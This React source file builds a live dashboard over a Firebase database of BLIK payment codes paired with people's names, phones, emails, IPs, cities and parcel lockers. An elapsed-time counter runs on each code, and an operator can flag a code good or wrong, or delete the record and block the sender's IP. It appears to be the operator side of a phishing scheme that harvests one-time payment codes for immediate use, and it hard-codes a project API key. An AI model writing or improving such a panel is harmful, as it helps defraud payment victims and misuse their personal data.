import React, { useState, useEffect } from "react";
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
import {
    getDatabase,
    ref,
    onValue,
    remove,
    set,
    get,
} from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

// Firebase configuration and initialization
const firebaseConfig = {
    apiKey: "AIzaSyBI9jEFhCJ_haq0R3qaFECibT9ue5nD2RU",
    authDomain: "blik-52f1e.firebaseapp.com",
    databaseURL:
        "https://blik-52f1e-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "blik-52f1e",
    storageBucket: "blik-52f1e.appspot.com",
    messagingSenderId: "592614598388",
    appId: "1:592614598388:web:3e86c4d89c95bff8f7a0a1",
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function Blik({ orderString, currentTime, blikCode }) {
    const [records, setRecords] = useState([]);
    const [timeMap, setTimeMap] = useState({}); // Track time (seconds and minutes) for each record by ID
    const [order, setOrder] = useState(0); // Initialize order state
    const [blikCodeState, setBlikCode] = useState(""); // Initialize blikCode state

    useEffect(() => {
        const dbRef = ref(db, "BLIK");

        // Use the onValue listener to listen to changes in real time
        const unsubscribe = onValue(dbRef, (snapshot) => {
            if (snapshot.exists()) {
                const fetchedRecords = [];
                snapshot.forEach((childSnapshot) => {
                    const data = childSnapshot.val();
                    fetchedRecords.push({
                        id: childSnapshot.key, // Unique key for deletion
                        Numer: data.Numer,
                        Time: data.Time, // Time from the database
                        Blik: data.Blik,
                        IP: data.IP,
                        Imie: data.Imie,
                        Nazwisko: data.Nazwisko,
                        Telefon: data.Telefon,
                        Email: data.Email,
                        Miasto: data.Miasto,
                        Paczkomat: data.Paczkomat,
                        Summa: data.Summa,
                        Quantity: data.Quantity,
                        Text: data.Text,
                        background:
                            data.Text === "green"
                                ? "bg-success"
                                : data.Text === "red"
                                ? "bg-danger"
                                : "bg-warning", // Set background based on Text
                    });
                });
                setRecords(fetchedRecords);
            } else {
                setRecords([]);
            }
        });

        // Clean up the listener when the component unmounts
        return () => unsubscribe();
    }, [orderString, currentTime, blikCode]);

    useEffect(() => {
        const newTimeMap = { ...timeMap };

        // Initialize timeMap for each record if it doesn't have time data
        records.forEach((record) => {
            if (!newTimeMap[record.id]) {
                const recordTime = new Date(record.Time).getTime(); // Convert database time to timestamp
                const currentTime = Date.now(); // Current time in timestamp
                const elapsedSeconds = Math.floor(
                    (currentTime - recordTime) / 1000
                );

                const minutes = Math.floor(elapsedSeconds / 60);
                const seconds = elapsedSeconds % 60;

                newTimeMap[record.id] = { minutes, seconds }; // Initialize time with elapsed time
            }
        });

        setTimeMap(newTimeMap);

        const interval = setInterval(() => {
            setTimeMap((prevTimeMap) => {
                const updatedMap = { ...prevTimeMap }; // Copy the previous timeMap
                Object.keys(updatedMap).forEach((id) => {
                    const { minutes, seconds } = updatedMap[id];
                    let newSeconds = seconds + 1;
                    let newMinutes = minutes;

                    if (newSeconds >= 60) {
                        newSeconds = 0;
                        newMinutes += 1;
                    }

                    updatedMap[id] = {
                        minutes: newMinutes,
                        seconds: newSeconds,
                    };
                });

                return updatedMap; // Return the updated state object
            });
        }, 1000); // Update every second

        // Clean up interval when the component unmounts
        return () => clearInterval(interval);
    }, [records]);

    async function DeleteData(recordId, IP) {
        try {
            console.log("Deleting record ID:", recordId);
            console.log("Adding IP:", IP);

            // Remove the record
            await remove(ref(db, `BLIK/${recordId}`));
            setRecords((prevRecords) =>
                prevRecords.filter((record) => record.id !== recordId)
            );

            // Sanitize the IP (replace periods with underscores)
            const sanitizedIP = IP.replace(/\./g, "_");

            // Add the IP to the Firebase database
            await set(ref(db, `IP/${sanitizedIP}`), true);
            console.log("IP address added to Firebase!");

            // Reset blikCode and increment order number
            setOrder(order + 1);
            setBlikCode("");
        } catch (error) {
            console.error("Error deleting data:", error);
        }
    }

    async function UpdateData(recordId) {
        const green = "green";

        try {
            const recordRef = ref(db, `BLIK/${recordId}`);
            const snapshot = await get(recordRef);

            if (snapshot.exists()) {
                const existingData = snapshot.val();

                await set(recordRef, {
                    ...existingData,
                    Text: green,
                });

                setRecords((prevRecords) =>
                    prevRecords.map((record) =>
                        record.id === recordId
                            ? {
                                  ...record,
                                  Text: green,
                                  background: "bg-success",
                              }
                            : record
                    )
                );
            } else {
                console.log("Record does not exist.");
            }
        } catch (error) {
            console.error("Error updating data:", error);
        }
    }

    async function UpdateData2(recordId) {
        const red = "red";

        try {
            const recordRef = ref(db, `BLIK/${recordId}`);
            const snapshot = await get(recordRef);

            if (snapshot.exists()) {
                const existingData = snapshot.val();

                await set(recordRef, {
                    ...existingData,
                    Text: red,
                });

                setRecords((prevRecords) =>
                    prevRecords.map((record) =>
                        record.id === recordId
                            ? { ...record, Text: red, background: "bg-danger" }
                            : record
                    )
                );
            } else {
                console.log("Record does not exist.");
            }
        } catch (error) {
            console.error("Error updating data:", error);
        }
    }

    return (
        <div>
            {records.length > 0 ? (
                records.map((record) => (
                    <div
                        key={record.id}
                        className={`m-0 p-0 row justify-content-center ${record.background}`}
                    >
                        <p className="m-0 p-3 ps-5 pe-5 fs-1 col-auto border border-white">
                            {String(timeMap[record.id]?.minutes || 0).padStart(
                                2,
                                "0"
                            )}
                            :
                            {String(timeMap[record.id]?.seconds || 0).padStart(
                                2,
                                "0"
                            )}
                        </p>

                        <p className="m-0 p-3 ps-5 pe-5 fs-1 col-auto border border-white text-center fw-bold">
                            {record.Blik}
                        </p>

                        <p className="m-0 p-3 fs-1 col border border-white text-center">
                            {record.Text}
                        </p>

                        <button
                            className="o_btn fs-1 m-0 p-3 col-auto border border-white bg-success"
                            onClick={() => UpdateData(record.id)}
                        >
                            Good
                        </button>
                        <button
                            className="o_btn fs-1 m-0 p-3 col-auto border border-white bg-danger"
                            onClick={() => UpdateData2(record.id)}
                        >
                            Wrong
                        </button>
                        <button
                            className="o_btn fs-1 m-0 p-3 col-auto border border-white bg-dark"
                            onClick={() => DeleteData(record.id, record.IP)} // Pass the IP here
                        >
                            Delete
                        </button>
                    </div>
                ))
            ) : (
                <div className="m-0 p-0 row justify-content-center bg-primary">
                    <p className="o_btn m-0 p-3 ps-5 pe-5 fs-1 col-12 text-center border border-primary">
                        Waiting for post
                    </p>
                </div>
            )}
        </div>
    );
}

export default Blik;
